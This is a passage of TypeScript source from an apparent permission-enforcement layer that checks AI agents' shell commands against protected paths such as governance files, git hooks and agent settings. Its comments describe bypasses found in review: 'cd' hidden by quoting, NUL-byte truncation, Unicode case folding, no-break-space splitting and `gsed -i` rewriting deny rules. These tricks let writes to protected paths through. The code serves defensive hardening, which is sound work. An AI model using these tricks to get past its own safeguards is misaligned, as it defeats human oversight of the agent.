        out += String.fromCharCode(parseInt(m[0], 8) & 0xff);
        i += m[0].length - 1;
      }
    } else out += c;
  }
  // a NUL produced by an escape is marked, not kept: the analyzer's own markers begin with a real NUL, so cutting at
  // every NUL would cut those, while a NUL the USER wrote (`$'\\0'`, `\\x00`) is what truncates a word
  return out.replace(/\0/g, NUL_CUT);
}
/** Consume a `$'...'` ANSI-C literal starting at s[i] (which is `$`); returns the decoded word and the index of the
 *  closing quote, or null if s[i] does not start an ANSI-C quote. */
function ansiCAt(s: string, i: number): { text: string; end: number } | null {
  if (s[i] !== '$' || s[i + 1] !== "'") return null;
  let j = i + 2;
  let body = '';
  while (j < s.length && s[j] !== "'") {
    if (s[j] === '\\' && j + 1 < s.length) {
      body += s[j]! + s[j + 1]!;
      j += 2;
    } else {
      body += s[j]!;
      j++;
    }
  }
  return { text: decodeAnsiC(body), end: j };
}

/** WHICH DIRECTORY CHANGE THIS SEGMENT IS, however its head is spelled. `'cd' control-plane`, `c\d control-plane`,
 *  `c""d …`, `builtin cd …`, `command cd …`, `FOO=1 cd …`, `! cd …`, `noglob cd …` and `while cd …; do` are all the
 *  builtin - the shell removes the quoting, the assignment and the keyword before it looks the word up - and a test
 *  written against the text `cd` saw none of them, so the working directory never moved and `tee
 *  permissions/matchers.md` was resolved against the wrong one: a write to the governance tree at ALLOW (exit
 *  review 10). Position is the one the parse reached, not the first token that happens to spell it. Redirections are
 *  not arguments: `cd control-plane >/dev/null` changes to `control-plane`. */
function directoryChange(
  text: string,
): { verb: 'cd' | 'pushd' | 'popd'; args: string[]; bypassesFunctions: boolean; viaCommand: boolean } | null {
  const t = commandWords(tokenizeMarked(expandBraces(text))).map((x) => x.text);
  let i = 0;
  let bypass = false;
  let viaCommand = false;
  for (;;) {
    const w = t[i];
    if (w === undefined) return null;
    if (/^[A-Za-z_][A-Za-z0-9_]*=/.test(w) || PREFIX_KEYWORDS.has(w) || w === 'noglob' || w === 'nocorrect') i++;
    else if (w === 'builtin') {
      bypass = true;
      i++;
      if (t[i] === '--') i++;
    } else if (w === 'command') {
      // `command -v cd` and `-V` only DESCRIBE the name; `command cd` and `command -p cd` run it - in bash. zsh's
      // `command` looks for an EXTERNAL program, where `cd` changes only its own process
      bypass = true;
      viaCommand = true;
      i++;
      while (t[i] === '-p' || t[i] === '--') i++;
    } else break;
  }
  const verb = t[i];
  return verb === 'cd' || verb === 'pushd' || verb === 'popd'
    ? { verb, args: t.slice(i + 1), bypassesFunctions: bypass, viaCommand }
    : null;
}

/** WHERE EACH STAGE OF A UNIT RUNS - as a SET, because a shell that has met a conditional `cd` is in more than one
 *  place at once as far as anything reading the text can tell.
 *
 *  A working directory tracked as one string was wrong in a dozen ways that all came from pretending the answer is
 *  single: `test -d x && cd x; tee f`, `true || cd sub; tee f`, a `cd` in a branch that DOES run, a function that is
 *  called, `cd; tee f` (home), `cd dir >/dev/null`, `pushd`/`popd` with a stack (exit review 10, self-attack: eleven
 *  findings). This returns, for every stage, the directories it MAY start in; the first is the one the rest of the
 *  kernel resolves against, and more than one - or an unknown - means nothing positive may rest on the directory,
 *  while every relative path is judged in EACH of them and the strongest answer wins.
 *
 *  What does not reach the caller is ignored outright: a stage in a pipeline, a background job, a subshell, a
 *  command or process substitution. What may not run (a branch, a case arm, the right of `||`, a function body) is
 *  UNIONED. What runs only if the stage before it succeeded (`&&`) holds for the rest of its chain and leaves the
 *  earlier directory possible afterwards, because the chain may have stopped. Proven by a differential test against
 *  bash and zsh (`exit-review-10.test.ts`): whatever directory a real shell ends in is in the modelled set. */
export const CWD_UNKNOWN = '\0dynamic';
export interface CwdPoint {
  /** the directories this stage may start in, primary first; never contains CWD_UNKNOWN */
  dirs: string[];
  /** true when the directory could not be established at all */
  unknown: boolean;
  /** true when THIS stage is a directory change whose target could not be resolved */
  dynamicCd: boolean;
}
export function cwdTimeline(
  stages: readonly ShellStage[],
  start: string,
  startVerified = true,
  readScript?: (abs: string) => string | null,
): CwdPoint[] {
  const out: CwdPoint[] = [];
  // THE COMMON CASE COSTS NOTHING: a unit with no word that could change the directory keeps the one it started in.
  // Quoting, escapes and braces are stripped first, so `'cd'`, `c\\d` and `c{d,d}` do not slip past the test.
  const mayChange = stages.some((st) => {
    const flat = (st.text.includes('{') ? expandBraces(st.text) : st.text).replace(/['"\\]/g, '');
    return /(^|[^A-Za-z0-9_./-])(cd|pushd|popd|source|eval|chdir)($|[^A-Za-z0-9_-])|^\s*\.\s/.test(flat) || flat.startsWith(FUNCTION_DEF_PREFIX);
  });
  if (!mayChange) {
    const dirs = startVerified ? [start] : [start];
    return stages.map(() => ({ dirs: [...dirs], unknown: !startVerified, dynamicCd: false }));
  }
  const union = (a: Set<string>, b: Set<string>): Set<string> => new Set([...a, ...b]);
  let now = new Set<string>(startVerified ? [start] : [start, CWD_UNKNOWN]);
  let extra = new Set<string>();
  let oldpwd: Set<string> | null = null;
  const stack: Array<Set<string>> = [];
  let condDepth = 0;
  let fnDepth = 0;
  const shadowed = new Set<string>();
  const isMarker = (x: ShellStage) => x.text.startsWith(MARK);
  const nextReal = (from: number): ShellStage | undefined => {
    for (let j = from + 1; j < stages.length; j++) if (!isMarker(stages[j]!)) return stages[j];
    return undefined;
  };
  const resolveTarget = (operand: string, base: string, physical: boolean): string[] => {
    if (base === CWD_UNKNOWN) return [CWD_UNKNOWN];
    const expanded = expandHome(operand, base);
    if (expanded === null || /[$`*?[{]/.test(expanded)) return [CWD_UNKNOWN];
    const logical = canonicalPath(isAbsolute(expanded) ? expanded : resolve(base, expanded));
    if (!/(^|\/)\.\.(\/|$)/.test(expanded)) return [logical];
    // `..` AFTER A SYMLINK goes two places: LOGICAL (the default) applies it to the text, PHYSICAL (-P, `set -P`, zsh's
    // chase_dots) follows the link first. Which one the shell uses can be changed by an earlier line, so unless the
    // command says `-P` or `-L` itself, both are possible
    let cur = isAbsolute(expanded) ? '/' : base;
    for (const part of expanded.split('/')) {
      if (part === '' || part === '.') continue;
      try {
        cur = part === '..' ? dirname(realpathSync(cur)) : realpathSync(join(cur, part));
      } catch {
        cur = part === '..' ? dirname(cur) : join(cur, part);
      }
    }
    return physical ? [cur] : cur === logical ? [logical] : [logical, cur];
  };
  const scopes: Array<{ id: number; now: Set<string>; extra: Set<string>; oldpwd: Set<string> | null; stack: Array<Set<string>>; stackAmbiguous: boolean; mayStop: boolean }> = [];
  let stackAmbiguous = false;
  /** whether an earlier stage of the CURRENT `&&` chain could have failed, ending the chain before the stage after it */
  let mayStop = false;
  for (let i = 0; i < stages.length; i++) {
    const st = stages[i]!;
    const text = expandBraces(st.text).trim();
    if (st.text.startsWith(`${FUNCTION_DEF_PREFIX} `)) {
      fnDepth++;
      const name = st.text.slice(FUNCTION_DEF_PREFIX.length + 1);
      if (name === 'cd' || name === 'pushd' || name === 'popd') shadowed.add(name);
      out.push({ dirs: [...now].filter((d) => d !== CWD_UNKNOWN), unknown: now.has(CWD_UNKNOWN), dynamicCd: false });
      continue;
    }
    if (st.text === FUNCTION_BODY_END) {
      fnDepth = Math.max(0, fnDepth - 1);
      out.push({ dirs: [...now].filter((d) => d !== CWD_UNKNOWN), unknown: now.has(CWD_UNKNOWN), dynamicCd: false });
      continue;
    }
    if (st.text.startsWith(`${FUNCTION_UNBIND} `)) {
      shadowed.delete(st.text.slice(FUNCTION_UNBIND.length + 1));
    }
    if (isMarker(st)) {
      out.push({ dirs: [...now].filter((d) => d !== CWD_UNKNOWN), unknown: now.has(CWD_UNKNOWN), dynamicCd: false });
      continue;
    }
    // SUBSHELL SCOPES. Stages that share a subshell id share a shell: a `cd` inside is seen by the later stages of that
    // subshell and by nothing outside it, so the state is saved on the way in and put back on the way out
    const path = st.subshellPath ?? [];
    while (scopes.length && !path.includes(scopes[scopes.length - 1]!.id)) {
      const sc = scopes.pop()!;
      now = sc.now;
      extra = sc.extra;
      oldpwd = sc.oldpwd;
      stack.length = 0;
      stack.push(...sc.stack);
      stackAmbiguous = sc.stackAmbiguous;
      mayStop = sc.mayStop;
    }
    for (const id of path)
      if (!scopes.some((sc) => sc.id === id))
        scopes.push({ id, now, extra, oldpwd, stack: [...stack], stackAmbiguous, mayStop });
    // a new chain: what an earlier chain left possible joins the state
    const sep = st.sepBefore;
    const chainStart = i === 0 || sep === undefined || sep === ';' || sep === '\n' || sep === '&';
    if (chainStart && extra.size) {
      now = union(now, extra);
      extra = new Set();
    }
    if (chainStart) mayStop = false;
    const point: CwdPoint = { dirs: [...now].filter((d) => d !== CWD_UNKNOWN), unknown: now.has(CWD_UNKNOWN), dynamicCd: false };
    out.push(point);

    const next = nextReal(i);
    // a stage that FEEDS a pipe, runs in the background or sits in a subshell cannot reach the caller. The LAST stage
    // of a pipeline can: bash forks it, zsh does not, so it is conditional rather than inert
    const inert = next?.pipedFromPrevious === true || next?.sepBefore === '&';
    const lastOfPipeline = st.pipedFromPrevious && !inert;
    const dc = directoryChange(text);
    // a `source FILE` or an `eval` may change the directory in ways read from another file, or not at all
    const head = commandWords(tokenizeMarked(text)).map((x) => x.text);
    let hi = 0;
    while (hi < head.length && (/^[A-Za-z_][A-Za-z0-9_]*=/.test(head[hi]!) || PREFIX_KEYWORDS.has(head[hi]!))) hi++;
    const headWord = head[hi];
    let targets: Set<string> | null = null;
    let certain = true; // every resolved target exists now
    let conditional =
      fnDepth > 0 ||
      condDepth > 0 ||
      st.inCase === true ||
      lastOfPipeline ||
      sep === '||' ||
      dc?.viaCommand === true ||
      (dc !== null && !dc.bypassesFunctions && shadowed.has(dc.verb));
    // the right of `||` runs when the left FAILED - and a failed `cd` is what `extra` holds
    if (sep === '||' && extra.size) {
      now = union(now, extra);
      extra = new Set();
    }
    if (!inert && dc !== null) {
      const shadow = !dc.bypassesFunctions && shadowed.has(dc.verb);
      if (shadow) {
        // a function of that name answers: the builtin runs only if its body calls it, and those calls are stages of
        // their own (inside the body, hence conditional)
        targets = new Set(now);
      } else {
        const optionsEnded = dc.args.indexOf('--');
        const opts = dc.args.filter((a, k) => a.startsWith('-') && a !== '-' && (optionsEnded < 0 || k < optionsEnded) && a !== '--');
        const operands = dc.args.filter((a, k) => !(a.startsWith('-') && a !== '-' && (optionsEnded < 0 || k < optionsEnded)) && a !== '--');
        const physical = opts.some((o) => /^-[a-zA-Z]*P/.test(o));
        const t = new Set<string>();
        let quietUnknown = false;
        if (dc.verb === 'popd') {
          const popped = operands.length === 0 && !stackAmbiguous ? stack.pop() : undefined;
          if (popped) for (const d of popped) t.add(d);
          else {
            // a `popd` with nothing pushed in THIS command pops what an earlier one left: the directory is not known,
            // and that is a fact about what follows, not a question about the `popd` itself
            t.add(CWD_UNKNOWN);
            quietUnknown = true;
          }
        } else if (operands.length === 0) {
          // no operand: `cd` goes HOME; `pushd` swaps the top two, which is not modelled
          if (dc.verb === 'cd') t.add(canonicalPath(homedir()));
          else t.add(CWD_UNKNOWN);
        } else if (operands.length === 1 && operands[0] === '-') {
          if (dc.verb === 'cd' && oldpwd) for (const d of oldpwd) t.add(d);
          else t.add(CWD_UNKNOWN);
        } else if (operands.length === 1) {
          for (const b of now) for (const r of resolveTarget(operands[0]!, b, physical)) t.add(r);
        } else t.add(CWD_UNKNOWN); // zsh's two-word substitution form, bash's error
        targets = t;
        for (const d of t) {
          if (d === CWD_UNKNOWN && !quietUnknown) point.dynamicCd = true;
          else if (!directoryExists(d)) certain = false;
        }
        // a `pushd` whose target may not exist may not push either, and then the stack is not what it looks like
        if (dc.verb === 'pushd') {
          if (certain) stack.push(new Set(now));
          else stackAmbiguous = true;
        }
      }
    } else if (!inert && (headWord === 'source' || headWord === '.')) {
      // the file may change the directory; what it does is read where it can be, and unknown where it cannot
      const file = head[hi + 1];
      const t = new Set<string>(now);
      const text0 = file !== undefined && readScript && !/[$`*?[{]/.test(file) ? readScript(isAbsolute(file) ? file : resolve([...now][0] === CWD_UNKNOWN ? start : [...now][0]!, file)) : null;
      if (text0 === null) t.add(CWD_UNKNOWN);
      else {
        for (const sub of splitShellPipeline(text0)) {
          const sdc = directoryChange(sub.text);
          if (!sdc) continue;
          const ops = sdc.args.filter((a) => !a.startsWith('-'));
          if (ops.length === 1 && ops[0] !== '-') for (const b of now) for (const r of resolveTarget(ops[0]!, b, false)) t.add(r);
          else t.add(CWD_UNKNOWN);
        }
      }
      targets = t;
      conditional = true;
    } else if (!inert && headWord === 'eval') {
      targets = new Set([...now, CWD_UNKNOWN]);
      conditional = true;
    }
    if (targets !== null) {
      const before = now;
      if (conditional || sep === '||') {
        now = union(now, targets);
      } else if (sep === '&&') {
        // runs only if the chain has held so far; the rest of the chain runs in the target, and the directory before
        // it stays possible for whatever follows the chain - if the chain COULD have stopped before it, or this change
        // could itself fail
        if (mayStop || !certain) extra = union(extra, before);
        now = targets;
      } else {
        now = targets;
        if (!certain) extra = union(extra, before);
      }
      // OLDPWD is set only when the change SUCCEEDED, so one that may have failed leaves the earlier value possible
      oldpwd = (conditional || !certain) && oldpwd ? union(oldpwd, before) : before;
      if (targets.has(CWD_UNKNOWN) && !conditional && sep !== '&&') now = new Set(targets);
    }
    // a stage that is not a change to a directory that certainly exists can fail, and a chain that fails stops
    if (!(targets !== null && certain && !conditional && !inert && !targets.has(CWD_UNKNOWN))) mayStop = true;
    // keywords that open a branch: the condition itself ran (above, unconditionally); the body may not
    const kw = /^(?:(?:time|!)\s+(?:-\S+\s+)*)*(if|while|until|for|case|select)\b/.exec(text);
    const kwEnd = /^(fi|done|esac)(?![\w=-])/.test(text);
    if (kw) condDepth++;
    else if (kwEnd) condDepth = Math.max(0, condDepth - 1);
  }
  return out;
}

/** A C string ends at its first NUL, and a command's arguments are C strings: `touch $'control-plane/x\0/../../y'`
 *  hands touch the word `control-plane/x`. Kept whole, path normalisation collapsed `x<NUL>/..` and saw the harmless
 *  `y` (exit review 10). */
const NUL_CUT = '\uE000';
function cutAtNul(w: string): string {
  const k = w.indexOf(NUL_CUT);
  return k < 0 ? w : w.slice(0, k);
}

function tokenize(s: string): string[] {
  const out: string[] = [];
  let cur = '';
  let quote: string | null = null;
  // a QUOTED EMPTY WORD is still a word: `git config core.hooksPath ''` has three arguments (exit review 10)
  let wasQuoted = false;
  for (let i = 0; i < s.length; i++) {
    const ch = s[i]!;
    // a backslash escape is removed the way the shell removes it (`.ss\h` is `.ssh`), except inside single quotes
    if (ch === '\\' && quote !== "'" && i + 1 < s.length) {
      // INSIDE DOUBLE QUOTES A BACKSLASH ESCAPES ONLY `$`, A BACKTICK, `"`, `\\` AND A NEWLINE (POSIX 2.2.3); before any
      // other character it is LITERAL. `psql -c "\dt"` hands psql the two characters `\dt`, and dropping the
      // backslash here delivered `dt` - so a psql metacommand written the way everyone writes it was unreadable
      // (exit review 10). Outside quotes the backslash is always removed.
      if (quote === '"' && !/[$`"\\\n]/.test(s[i + 1]!)) {
        cur += ch;
        continue;
      }
      cur += s[++i]!;
      continue;
    }
    if (quote) {
      if (ch === quote) quote = null;
      else cur += ch;
      continue;
    }
    const ansi = ch === '$' ? ansiCAt(s, i) : null;
    if (ansi) {
      cur += ansi.text;
      i = ansi.end;
      continue;
    }
    if (ch === "'" || ch === '"') {
      quote = ch;
      wasQuoted = true;
      continue;
    }
    if (IFS_RE.test(ch)) {
      if (cur || wasQuoted) out.push(cutAtNul(cur));
      cur = '';
      wasQuoted = false;
      continue;
    }
    cur += ch;
  }
  if (cur || wasQuoted) out.push(cutAtNul(cur));
  return out;
}

/** THE NAME THE FILESYSTEM WILL RESOLVE, not the bytes that were typed.
 *
 *  macOS and Windows compare filenames with full Unicode case folding, which maps more than upper to lower:
 *  `ſ` (U+017F LATIN SMALL LETTER LONG S) folds to `s`, so `.harnesſ/runtime/pin.json` IS `.harness/runtime/`
 *  on the disk this kernel runs on — verified on this machine. Comparing the typed bytes let a write to EGO's
 *  own runtime, to `.claude/ſettings.json`, to `.huſky/pre-commit` and to `policieſ/organization/` reach ALLOW,
 *  and the plain case variant `.harness/hooKs/` did the same (exit review 8).
 *
 *  `toUpperCase().toLowerCase()` performs that fold in JavaScript: `'ſ'.toUpperCase()` is `'S'`. NFC first, so a
 *  decomposed name compares equal to its composed twin. On a case-SENSITIVE filesystem this over-matches a name
 *  that really is distinct; that direction only ever adds protection, and it is the direction to be wrong in. */
function foldName(p: string): string {
  return p.normalize('NFC').toUpperCase().toLowerCase();
}

export function matchPathPattern(pattern: string, absPath: string, ctx: EvaluationContext): boolean {
  const tryMatch = (posix: string, homeBase: string, roots: string[]): boolean => {
    let pat = pattern;
    let base: string | null = null;
    if (pat.startsWith('~/')) {
      pat = pat.slice(2);
      base = homeBase;
    }
    const re = globToRegExp(pat);
    if (base) return re.test(posix.startsWith(base + '/') ? posix.slice(base.length + 1) : '\0');
    // repo-relative patterns: test against every registered root, then against the cwd root
    for (const root of roots) {
      if (posix.startsWith(root + '/') && re.test(posix.slice(root.length + 1))) return true;
    }
    if (pat.startsWith('**/')) return re.test(posix);
    return false;
  };
  // Match against BOTH the realpath-resolved path (catches a symlink that points INTO a protected tree) AND the lexical
  // path (catches a protected NAME node that is itself a symlink, e.g. a `.git` symlink whose realpath drops the name).
  const canonRoots = [...ctx.repoRoots, ...(ctx.cwd ? [ctx.cwd] : [])].map((r) =>
    canonicalPath(r).split(sep).join('/'),
  );
  const lexRoots = [...ctx.repoRoots, ...(ctx.cwd ? [ctx.cwd] : [])].map((r) =>
    resolve(r).split(sep).join('/'),
  );
  const canonPosix = canonicalPath(absPath).split(sep).join('/');
  const lexPosix = (isAbsolute(absPath) ? absPath : resolve(absPath)).split(sep).join('/');
  // ...and once more on the FOLDED name, which is what the filesystem will actually resolve
  const foldRoots = canonRoots.map(foldName);
  return (
    tryMatch(canonPosix, canonicalPath(homedir()).split(sep).join('/'), canonRoots) ||
    (lexPosix !== canonPosix && tryMatch(lexPosix, homedir().split(sep).join('/'), lexRoots)) ||
    (foldName(canonPosix) !== canonPosix &&
      tryMatch(foldName(canonPosix), foldName(canonicalPath(homedir()).split(sep).join('/')), foldRoots))
  );
}

export function globToRegExp(glob: string): RegExp {
  let re = '^';
  for (let i = 0; i < glob.length; i++) {
    const ch = glob[i]!;
    if (ch === '*') {
      if (glob[i + 1] === '*') {
        // `.` does not match a line terminator, and a file name may hold one (CR, LF, U+2028, U+2029): every
        // `dir/**` rule was blind to a file whose name contained one (exit review 10)
        re += glob[i + 2] === '/' ? '(?:[\\s\\S]*/)?' : '[\\s\\S]*';
        i += glob[i + 2] === '/' ? 2 : 1;
      } else re += '[^/]*';
    } else if (ch === '?') re += '[^/]';
    else if ('\\^$.|+()[]{}'.includes(ch)) re += `\\${ch}`;
    else re += ch;
  }
  return new RegExp(re + '$', 'i');
}

function verdictFor(table: CompiledAuthorityTable, ctx: EvaluationContext, capability: string): Verdict {
  const p = table.profiles[ctx.profile] ?? table.profiles[Object.keys(table.profiles)[0]!];
  const m = p?.modes[ctx.mode] ?? p?.modes[table.defaultMode];
  return m?.[capability] ?? table.effective[capability] ?? 'ASK';
}

function isAbsoluteCap(table: CompiledAuthorityTable, id: string): boolean {
  return table.capabilities[id]?.absolute === true;
}

/** Canonical absolute path: symlinks resolved on the deepest existing ancestor so a not-yet-created file compares correctly. */
export function canonicalPath(p: string): string {
  const abs = resolve(p);
  try {
    return realpathSync(abs);
  } catch {
    const parent = dirname(abs);
    if (parent === abs) return abs;
    return join(canonicalPath(parent), abs.slice(parent.length + 1));
  }
}

function insideRoots(absPath: string, ctx: EvaluationContext): boolean {
  const posix = canonicalPath(absPath).split(sep).join('/');
  const roots = [...ctx.repoRoots, ...(ctx.egoHome ? [ctx.egoHome] : [])].map((r) =>
    canonicalPath(r).split(sep).join('/'),
  );
  return roots.some((r) => posix === r || posix.startsWith(r + '/'));
}

const TRUST_STORE_DIRS = ['trust', 'index', 'releases', 'runtimes'];
/** The trust store must be recognised however the path is cased: macOS and Windows resolve `~/.ego/RUNTIMES/…` to the
 *  real `runtimes` directory. Matching case-insensitively everywhere fails closed on a case-sensitive filesystem too. */
const foldCase = (p: string): string => p.toLowerCase();
/** true when a posix path IS one of the EGO_HOME trust-store directories or lies within it (the dir node itself counts). */
function underTrustDir(posix: string, home: string): boolean {
  const p = foldCase(posix);
  const h = foldCase(home);
  return TRUST_STORE_DIRS.some((d) => p === `${h}/${d}` || p.startsWith(`${h}/${d}/`));
}
/** Whether a path (or a glob's literal prefix) reaches the EGO_HOME trust store: at/under a trust dir; a glob that
 *  completes to one; or the EGO_HOME root itself under a glob or a recursive whole-tree op (parent copy/delete). */
function reachesTrustStore(prefixPosix: string, home: string, isGlob: boolean, recursive: boolean): boolean {
  const prefix = foldCase(prefixPosix);
  const h = foldCase(home);
  if (prefix === h) return isGlob || recursive;
  return TRUST_STORE_DIRS.some((d) => {
    const dir = `${h}/${d}`;
    if (prefix === dir || prefix.startsWith(dir + '/')) return true;
    if (isGlob && (dir.startsWith(prefix + '/') || dir.startsWith(prefix))) return true;
    return false;
  });
}
/** tools whose locked operations are searched for in argument position (see classifyCommand) */
const LOCKED_HEADS = new Set([
  'git',
  'gh',
  'glab',
  'az',
  'kubectl',
  'oc',
  'helm',
  'terraform',
  'pulumi',
  'aws',
  'gcloud',
  'argocd',
  'flux',
  'vault',
  'rm',
  'harness',
  'ego',
  'claude',
  'codex',
  'npx',
  'bunx',
  'pnpx',
]);

/** The OS temporary directory is scratch space: neither workspace nor protected. */
export function isScratchPath(abs: string): boolean {
  const posix = canonicalPath(abs).split(sep).join('/');
  const roots = new Set([
    canonicalPath(tmpdir()).split(sep).join('/'),
    '/tmp',
    '/private/tmp',
    '/var/tmp',
    '/private/var/tmp',
  ]);
  for (const r of roots) if (posix === r || posix.startsWith(r + '/')) return true;
  return false;
}
/** WHETHER A STREAM EDITOR EDITS THE FILE OR MERELY PRINTS IT. `sed -n '1p' f`, `perl -ne 'print' f` and
 *  `awk '{print}' f` READ their operands and write nothing; only the in-place flag turns the same tool into a
 *  writer. Treating the whole family as writers made `sed -n '1p' .claude/settings.json` — looking at a governed
 *  file — an ABSOLUTE DENY, while treating none of them as writers let `gawk -i inplace` rewrite it (exit
 *  review 8). Both halves are the same question, so it is asked once, here. */
function editsInPlace(head: string, tokens: string[]): boolean {
  if (/^(gawk|awk|mawk|nawk)$/.test(head))
    // gawk edits in place through an EXTENSION, not a flag: `-i inplace`, `-iinplace`, `--include inplace`
    return tokens.some((t, i) =>
      /^(-i|--include)$/.test(t) ? tokens[i + 1] === 'inplace' : /^(-i|--include=)inplace$/.test(t),
    );
  // `-i`, `-i.bak` (the backup suffix is glued to it), or the letter inside a cluster of flags that take no
  // argument. The cluster is spelled out rather than `[A-Za-z]*` because perl's `-Ilib` names an include PATH
  // and a loose test read the `i` of `lib` as the in-place flag.
  return tokens.some((t) => t === '--in-place' || t.startsWith('--in-place=') || /^-[nrEsuzpalwc0]*i/.test(t));
}

/** THE SHELL'S WORD SEPARATORS, AND ONLY THOSE. Default IFS is space, tab and newline — nothing else. JavaScript's
 *  `\s` also matches U+00A0 NO-BREAK SPACE, U+1680, U+2000-U+200A, U+202F, U+205F, U+3000 and U+FEFF, and NO
 *  POSIX shell treats any of them as a separator. Using it meant EGO SPLIT A WORD THE SHELL KEEPS WHOLE, which
 *  TRUNCATES a path: `echo x > control-plane/<U+00A0>evil.md` writes one file inside the control plane, and EGO
 *  read the redirection target as the bare directory `control-plane/` — which the glob `control-plane/**` does
 *  not match, because only its descendants do (exit review 10).
 *
 *  Every review before this one looked for a separator the shell honours and EGO does not. This is the mirror:
 *  a separator EGO INVENTS, which shortens a governed path into an ungoverned one. A carriage return is included
 *  because a CRLF file reaches the splitter with the `\r` still attached to the last word. */
const IFS_RE = /[ \t\n]/;

const WRITE_HEADS = new Set([
  'cp',
  'mv',
  // the GNU-named twins macOS installs: `gsed -i` edits in place exactly as `sed -i` does, and the destination
  // rules never saw it, so `gsed -i 's/DENY/ALLOW/' control-plane/permissions/absolute-denies.md` rewrote the
  // absolute denies themselves at ALLOW (exit review 7)
  'gsed',
  'gawk',
  'gcp',
  'gmv',
  'sort',
  'uniq',
  'yq',
  'tee',
  'ln',
  'install',
  'dd',
  'rsync',
  'sed',
  'perl',
  'truncate',
  'rm',
  'chmod',
  'chown',
  'touch',
  'mkdir',
  'rmdir',
  'python',
  'python3',
  'node',
  'tar',
  'bsdtar',
  'gtar',
  'unzip',
  'zip',
  'cpio',
  'pax',
  'gcp',
  'gmv',
  'ditto',
  'rename',
  'shred',
  'unlink',
  'patch',
  'git',
  'find', // `-fprint`/`-fls`/`-fprintf FILE` write FILE
  'scp',
  'ar', // `ar rcS ARCHIVE member…` writes ARCHIVE, whatever its extension says it is
]);

/** Value of an option in every spelling that a real CLI accepts: `--long VALUE`, `--long=VALUE`, `-o VALUE` and the
 *  glued short form `-oVALUE`, including when the letter sits inside a cluster (`-xC DIR`, `-xCDIR`, `-qod DIR`). */
function optionValue(tokens: string[], short: string, longs: string[]): string | null {
  // the tool applies the LAST occurrence, so the last one is the destination that actually gets written
  const all = optionValues(tokens, short, longs);
  return all.length ? all[all.length - 1]! : legacyOptionValue(tokens, short, longs);
}

function legacyOptionValue(tokens: string[], short: string, longs: string[]): string | null {
  for (let i = 1; i < tokens.length; i++) {
    const t = tokens[i]!;
    for (const l of longs) {
      if (t === l) return tokens[i + 1] ?? null;
      if (t.startsWith(l + '=')) return t.slice(l.length + 1);
    }
    if (!short || !t.startsWith('-') || t.startsWith('--')) continue;
    const at = t.indexOf(short, 1);
    if (at < 0) continue;
    // the characters between the dash and the option letter must themselves be option letters: without this, the
    // `h` inside `-url=jdbc:postgresql://localhost:5432/app` reads as `-h` and invents a host (round 14)
    if (!/^-[A-Za-z0-9]*$/.test(t.slice(0, at))) continue;
    const glued = t.slice(at + 1);
    if (glued) return glued;
    return tokens[i + 1] ?? null;
  }
  return null;
}

/** Options of copy-like tools that consume the NEXT token as their value; their value is never the destination. */
/** Value-taking options PER TOOL. A boolean flag listed here would swallow the real destination, which is exactly
 *  what `cp SRC -i DEST` did while `-i` (interactive) sat in a shared list (round 15). */
const VALUE_OPTS_BY_HEAD: Record<string, RegExp> = {
  cp: /^(--sparse|--reflink|-S|--suffix|--backup|-t|--target-directory|-Z|--context)$/,
  install: /^(-m|--mode|-o|--owner|-g|--group|-S|--suffix|-t|--target-directory|-Z|--context|--backup)$/,
  mv: /^(-S|--suffix|-t|--target-directory|--backup)$/,
  rsync:
    /^(-e|--rsh|--exclude|--include|--exclude-from|--include-from|--files-from|--log-file|--temp-dir|--partial-dir|--compare-dest|--link-dest|--copy-dest|--bwlimit|--timeout|--contimeout|--port|--chmod|--chown|--backup-dir|--suffix|--max-size|--min-size|--out-format|--rsync-path|--filter|-f|--block-size|--modify-window|--iconv)$/,
  scp: /^(-P|-i|-c|-F|-l|-J|-o|-S|-D)$/,
  cpio: /^(-H|--format|-F|--file|-R|--owner|-D|--directory)$/,
  ditto: /^(--arch|--bom|--extattr)$/,
};
const copyValueOpts = (head: string): RegExp | undefined => VALUE_OPTS_BY_HEAD[head];

/** The names git looks up in a hooks directory. */
const GIT_HOOK_FILE_RE =
  /^(?:applypatch-msg|pre-applypatch|post-applypatch|pre-commit|pre-merge-commit|prepare-commit-msg|commit-msg|post-commit|pre-rebase|post-checkout|post-merge|pre-push|pre-receive|update|proc-receive|post-receive|post-update|reference-transaction|push-to-checkout|pre-auto-gc|post-rewrite|sendemail-validate|fsmonitor-watchman|p4-changelist|p4-prepare-changelist|p4-post-changelist|p4-pre-submit|post-index-change)$/;

const hooksDirCache = new WeakMap<object, { dirs: string[]; files: string[] }>();

/** THE HOOKS DIRECTORIES THIS REPOSITORY CONFIGURES, apart from `.git/hooks`, and the files that decide where they
 *  are. EGO's shims live wherever `core.hooksPath` points, and a path rule can name only the conventional places
 *  (`.githooks`, `.husky`): `[core] hooksPath = githooks` made `githooks/pre-commit` an ordinary workspace file, so a
 *  Write replaced the secret scan the hook exists to run (exit review 10). The value is read from the repository's own
 *  config text as well as from git, because a checkout git cannot open is still one whose config file says where hooks
 *  live. Also protected: a file the config INCLUDES (it can set `core.hooksPath` itself) and the TARGET of a hook that
 *  is a symlink (writing the target rewrites the hook). */
function configuredHooksDirs(ctx: EvaluationContext): { dirs: string[]; files: string[] } {
  const cached = hooksDirCache.get(ctx);
  if (cached) return cached;
  const dirs = new Set<string>();
  const files = new Set<string>();
  for (const root of ctx.repoRoots) {
    const values: string[] = [];
    try {
      const text = readFileSync(join(root, '.git', 'config'), 'utf8');
      let section = '';
      for (const line of text.split(/\r?\n/)) {
        const sec = /^\s*\[([^\]]+)\]/.exec(line);
        if (sec) section = sec[1]!.trim().toLowerCase();
        const hp = section === 'core' ? /^\s*hookspath\s*=\s*(.*?)\s*$/i.exec(line) : null;
        if (hp) values.push(hp[1]!.replace(/^"(.*)"$/, '$1'));
        const inc = /^(?:include|includeif\b.*)$/.test(section) ? /^\s*path\s*=\s*(.*?)\s*$/i.exec(line) : null;
        if (inc) {
          const f = inc[1]!.replace(/^"(.*)"$/, '$1');
          files.add(canonicalPath(f.startsWith('~/') ? join(homedir(), f.slice(2)) : isAbsolute(f) ? f : resolve(root, '.git', f)).split(sep).join('/'));
        }
      }
    } catch {
      /* no readable config: git is asked below */
    }
    const viaGit = gitConfigGet(root, 'core.hooksPath');
    if (viaGit) values.push(viaGit);
    for (const v of values) {
      if (!v) continue;
      const d = canonicalPath(resolveHooksPath(root, v)).split(sep).join('/');
      dirs.add(d);
      // a hook that is a symlink is its target, wherever the target lives
      try {
        for (const e of readdirSync(d)) {
          try {
            const real = realpathSync(join(d, e)).split(sep).join('/');
            if (!real.startsWith(d + '/')) files.add(real);
          } catch {
            /* a dangling link: nothing to protect yet */
          }
        }
      } catch {
